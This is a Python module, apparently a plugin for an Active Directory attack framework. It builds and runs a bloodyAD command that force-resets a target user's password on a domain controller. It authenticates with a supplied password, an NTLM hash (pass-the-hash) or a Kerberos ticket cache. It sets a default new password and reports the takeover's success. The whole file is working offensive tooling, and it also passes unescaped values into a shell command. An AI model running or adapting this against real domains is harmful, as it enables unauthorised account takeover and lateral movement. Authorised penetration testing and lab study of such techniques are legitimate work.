def run(data, cred, args):
    import subprocess

    # Colors
    G, R, B, E = "\033[92m", "\033[91m", "\033[94m", "\033[0m"

    quiet = getattr(args, "quiet", False)

    # ---------------- INPUT ----------------
    if not args.extra or len(args.extra) < 1:
        print(f"{R}[-] Missing target user{E}")
        return {"success": False}

    target_user = args.extra[0]
    new_password = args.extra[1] if len(args.extra) > 1 else "NewPass123!"

    domain = data.get("domain")
    dc = data.get("ip")

    if not domain or not dc:
        print(f"{R}[-] Missing domain or DC IP{E}")
        return {"success": False}

    if not cred:
        print(f"{R}[-] No credentials provided{E}")
        return {"success": False}

    user = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not user or not typ:
        print(f"{R}[-] Invalid credential format{E}")
        return {"success": False}

    # ---------------- BUILD COMMAND ----------------
    base = f"bloodyAD --host {dc} -d {domain} -u {user}"

    if typ == "password":
        cmd = f"{base} -p {secret} set password {target_user} {new_password}"

    elif typ == "ntlm":
        # ensure LM:NT format
        ntlm = secret if ":" in secret else f":{secret}"
        cmd = f"{base} -p {ntlm} set password {target_user} {new_password}"

    elif typ == "ticket":
        # secret = ccache path
        cmd = f"KRB5CCNAME={secret} {base} -k --no-pass set password {target_user} {new_password}"

    else:
        print(f"{R}[-] Unsupported credential type{E}")
        return {"success": False}

    # ---------------- EXECUTE ----------------
    if not quiet:
        print(f"[*] Running: {cmd}")

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"{R}[-] Execution failed: {e}{E}")
        return {"success": False}

    output = result.stdout + result.stderr

    if not quiet:
        print(output)

    # ---------------- PARSE ----------------
    success = any(x in output.lower() for x in [
        "success",
        "changed",
        "password set",
        "updated"
    ])

    if success:
        print(f"{G}[+] Password changed for {target_user}{E}")
    else:
        print(f"{R}[-] Failed to change password for {target_user}{E}")

    return {
        "success": success,
        "user": target_user,
        "pass": new_password
    }